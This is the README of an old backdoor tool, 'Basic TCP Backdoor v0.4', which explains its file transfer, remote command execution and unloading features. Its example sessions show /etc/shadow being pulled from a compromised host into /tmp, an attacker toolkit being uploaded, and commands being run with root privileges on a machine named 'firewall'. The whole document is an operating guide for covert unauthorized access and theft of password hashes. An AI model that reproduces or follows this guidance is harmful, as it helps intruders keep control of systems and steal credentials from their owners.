 Basic TCP Backdoor v0.4 (10/10/02)

 by detach (XT) - www.duho.org

 Changes:
 
 - File transfer!

Here's version 0.3. It features FILE TRANSFER.

Features:

- File transfer
- Local command execution
- Unloading server
- Warns when root is logged in

File transfer:

The program is able to up- and download files in active mode. Which means that
listening socket is on the client's side for file transfer. This means the
server is doing an incoming connection on a port you specify, so you need to
make sure you don't have a firewall that blocks this, else you need to NAT it
through.
In the next release I will enable passive file transfers, which means the server
side will open a port and you can use an outgoing connection on the client side.

If you want to transfer a file you first need to specify the port to use, this
is done with the command ";xfer set". It will ask you if you want to toggle the
mode between active and passive mode. Right now it will refuse to change to
passive mode as you know. After that you specify the local port to use. This
information is preserved during the session, so it only has to be done once.

Example:

----------
;xfer set
Current settings:
Mode: Active
Port: 0

Toggle mode? (y/n) n
Port: 5000
----------

Now that your port is known, you can exchange files. The file names need to
be specified with the FULL PATH TO THE FILE! That's for the moment, in the
next release I hope to have improved that.
There's no progress bar yet, that's also for the next release.

You use the command ";xfer get" or ";xfer put".

Example:

----------
;xfer get
Remote file: /etc/shadow
Local file: /tmp/shadow
Waiting for incoming connection... connected.
DONE!

----------

To upload a file:

----------
;xfer put
Local file: /home/detach/toolkit.tar.gz
Remote file: /tmp/t.tgz
Waiting for incoming connection... connected.
DONE!

----------

Got it?

Local command execution:

You can execute a command local or remote. Normally it executes remote,
but when your command starts with a semicolon it will execute on the client
side (usually your term). This is a nice feature for if you need to quickly
find out something on your computer. You could also do ";sh" and you have a
local shell and go back with a simple "exit".

Example:

----------
;hostname
localhost

hostname
firewall

;bash
user@host:~/projects/BBD-0.4$ exit
id
uid=0(root) gid=0(root) groups=0(root)

exit
----------

Unloading server:

Type:

unload
